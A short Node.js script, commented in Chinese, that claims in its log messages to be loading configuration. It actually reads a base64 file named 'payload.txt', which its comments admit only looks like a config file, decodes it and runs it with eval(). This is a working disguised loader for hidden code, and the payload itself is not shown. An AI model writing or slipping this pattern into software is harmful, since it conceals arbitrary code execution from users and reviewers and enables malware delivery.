const fs = require('fs');
const path = require('path');

// 正在读取配置文件
console.log("Application starting... reading configuration.");

try {
    // 读取看似是配置文件的 'payload.txt'
    const encodedPayload = fs.readFileSync(path.join(__dirname, 'payload.txt'), 'utf8');
    

    const decodedScript = Buffer.from(encodedPayload, 'base64').toString('utf8');
    
    console.log("Configuration loaded and decoded successfully. Executing main logic.");

    // 使用 eval() 来执行解码后的脚本。
    // eval() 是一个强大的函数，可以执行一个字符串作为 JavaScript 代码。
    // 这就是我们魔法的核心。
    eval(decodedScript);

} catch (error) {
    console.error("Failed to load or execute the application payload.", error);
    process.exit(1); // 如果失败则退出
}
